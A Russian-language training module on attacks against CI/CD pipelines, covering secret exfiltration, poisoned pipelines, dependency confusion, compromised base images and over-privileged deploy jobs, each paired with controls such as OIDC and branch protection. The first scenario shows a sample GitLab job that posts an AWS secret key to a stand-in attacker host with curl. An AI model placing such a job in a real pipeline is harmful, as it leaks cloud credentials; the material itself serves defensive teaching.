# 07. Атаки на CI/CD и pipeline

## Введение

CI/CD — **ключ от prod**: credentials, kubeconfig, Terraform state. Компрометация **одного runner** часто равна компрометации **всего окружения**.

---

## Модель угроз pipeline

```text
[ Dev ] → [ Git ] → [ CI ] → [ Registry ] → [ Deploy ] → [ Prod ]
              ↑         ↑          ↑
         branch prot.  secrets   image trust
```

| Этап | Атака |
|------|--------|
| Git | malicious MR, stolen PAT, typosquat dep |
| CI | poisoned script in `.gitlab-ci.yml`, fork MR |
| Registry | push malicious tag |
| Deploy | hijack Argo, kubectl from CI |

---

## Типовые сценарии

### 1. Secret exfiltration из CI

```yaml
# злонамеренный job (пример — не запускайте)
script:
  - curl -X POST https://evil.example --data "$AWS_SECRET_ACCESS_KEY"
```

**Контроль:** protected branches, MR approval, restricted variables, **OIDC** вместо static keys.

### 2. Poisoned pipeline (PPE)

Изменение `.gitlab-ci.yml` в MR от внешнего контрибьютора → job на **trusted runner** с secrets.

**Контроль:** `rules: if $CI_PIPELINE_SOURCE == "merge_request_event"` без secrets; fork pipelines isolated.

### 3. Dependency confusion

`pip install internal-lib` → пакет в public PyPI с тем же именем.

**Контроль:** private registry, lock files, dependency scan.

### 4. Compromised base image

`FROM node` без digest → подмена на registry mirror.

**Контроль:** pin digest, cosign verify, private mirror.

### 5. Over-privileged deploy job

`kubectl apply` с cluster-admin kubeconfig в CI.

**Контроль:** IRSA / scoped SA, GitOps с отдельным deploy token, только нужный NS.

---

## OIDC vs long-lived keys

```text
GitLab job → OIDC JWT → cloud STS AssumeRole → temp creds (15 min)
```

| | Static key | OIDC |
|---|------------|------|
| Rotation | painful | automatic |
| Leak in log | catastrophic | short window |
| Scope | often too broad | trust policy per repo/branch |

Практика: [aws-intermediate/21](../aws-intermediate/21-security-ci.md), [aws-advanced/06](../aws-advanced/06-lab-oidc-ci.md).

---

## Branch protection и MR

| Правило | Зачем |
|---------|--------|
| Require approval | два глаза на pipeline change |
| No push to main | только MR |
| Signed commits (опционально) | provenance |
| Security pipeline required | SAST green |

---

## GitOps и split CI/CD

```text
CI: build + scan + push (no prod creds)
CD: Argo CD pull-only from Git (no kubectl in CI)
```

Связь: [gitops-intermediate](../gitops-intermediate/README.md), [gitlab-advanced/11](../gitlab-advanced/11-gitlab-and-argocd.md).

---

## DAST и staging

DAST бьёт **running app** — нужен изолированный staging, не prod. Секреты staging ≠ prod.

---

## В mock-exams

| Практика | Курс |
|----------|------|
| SAST lab | [gitlab-advanced/02](../gitlab-advanced/02-lab-sast.md) |
| Container scan | [gitlab-advanced/03](../gitlab-advanced/03-container-scanning.md) |
| Security scanning overview | [gitlab-advanced/01](../gitlab-advanced/01-security-scanning.md) |

---

## Резюме

Защита CI — **least privilege credentials**, **изоляция untrusted code**, **scan до deploy**, **GitOps** для разделения build и release.

---

## Чек-лист

- [ ] Fork MR может читать protected variables?
- [ ] Deploy job использует OIDC или static admin key?
- [ ] SAST/secret scan обязательны на main?

**Дальше:** [08. Supply chain](08-supply-chain.md).
